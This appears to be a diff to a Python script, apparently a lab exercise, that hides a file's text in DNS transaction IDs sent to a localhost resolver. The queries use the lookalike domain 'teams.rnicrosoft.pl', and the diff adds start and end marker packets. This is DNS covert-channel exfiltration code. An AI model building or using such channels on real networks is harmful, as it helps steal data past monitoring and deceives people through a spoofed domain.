@@ -11,7 +11,7 @@ def mix_two_chars_bits(chunk):
     return mixed
 
 def modify_txid_based_on_last_bits(chunk):
-    last_two_bits = chunk[-2:]  # Ostatnie 2 bity
+    last_two_bits = chunk[-2:]
     last_two_int = int(last_two_bits, 2)
     
     if last_two_int % 2 == 0:
@@ -30,7 +30,24 @@ def send_dns_query(filepath):
     
     binary_list = text_to_binary_list(text)
     binary_data = ''.join(binary for _, binary in binary_list)
-    
+
+    special_char = 0x0000
+
+    # Start przesylania ukrytej wiadomosci
+    end_query = DNSRecord(
+        DNSHeader(id=special_char + 1500),
+        q=DNSQuestion("teams.rnicrosoft.pl", QTYPE.A)
+    )
+    client.sendto(end_query.pack(), ('127.0.0.1', 5353))
+    print(f"Sent START TXID: {special_char} + 1500")
+
+    try:
+        response, _ = client.recvfrom(512)
+        print("Response received")
+    except socket.timeout:
+        print("No response received (timeout)")
+
+    # Wlasciwe dane
     for i in range(0, len(binary_data), 16):
         chunk = binary_data[i:i+16]
         if len(chunk) < 16:
@@ -38,7 +55,7 @@ def send_dns_query(filepath):
         
         chunk = mix_two_chars_bits(chunk)
         number_to_add = modify_txid_based_on_last_bits(chunk)
-        txid = int(chunk, 2)  # Konwersją bitów na int
+        txid = int(chunk, 2)  # Konwersja bitów na int
         
         # DNS query
         query = DNSRecord(
@@ -50,13 +67,12 @@ def send_dns_query(filepath):
         print(f"Sent TXID: {txid} (chunk: {chunk})")
 
     # Koniec przesylania ukrytej wiadomosci
-    end_txid = 0x0000
     end_query = DNSRecord(
-        DNSHeader(id=end_txid),
+        DNSHeader(id=special_char + 1500),
         q=DNSQuestion("teams.rnicrosoft.pl", QTYPE.A)
     )
     client.sendto(end_query.pack(), ('127.0.0.1', 5353))
-    print(f"Sent END TXID: {end_txid} (chunk: 0000000000000000)")
+    print(f"Sent END TXID: {special_char} + 1500")
 
     try:
         response, _ = client.recvfrom(512)
